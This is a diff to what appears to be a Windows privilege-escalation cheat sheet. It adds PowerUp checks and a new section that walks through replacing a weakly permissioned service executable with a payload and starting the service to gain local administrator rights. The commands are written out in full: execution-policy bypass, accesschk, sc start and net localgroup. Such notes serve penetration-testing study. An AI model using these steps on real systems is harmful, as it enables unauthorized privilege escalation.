@@ -155,6 +155,7 @@
   ```cmd
   powershell -ep bypass
   . .\PowerUp.ps1
+  Invoke-AllChecks
   ```
 #### Exploiting Autoruns
   1. Generate a msfvenom payload
@@ -228,11 +229,28 @@
   ```
   9. PROFIT!
 
-
-
-
-
-## Exe FIles
+## Executable FIles
+  1. Run PowerUp.ps1 and check for service executable and argument permissions
+    ```cmd
+  powershell -ep bypass
+  . .\PowerUp.ps1
+  Invoke-AllChecks
+  ```
+  2. Run accesschk64.exe on the path of the executable look fot Everyone FILE_ALL_ACCESS
+  ```cmd
+  accesscheck64.exe -wvu "C:\Path\to\Executable"
+  ```
+  3. Save the x.exe from earlier to the location of the executable
+  4. Start the service
+  ```cmd
+  sc start <service>
+  ```
+  5. Verify that the user is in the local administrator group
+  ```cmd
+  net localgroup administrators
+  ```
+  6. PROFIT!
+  
 ## Startup Application
 ## DLL Hijacking
 ## Service Permissions (Paths)
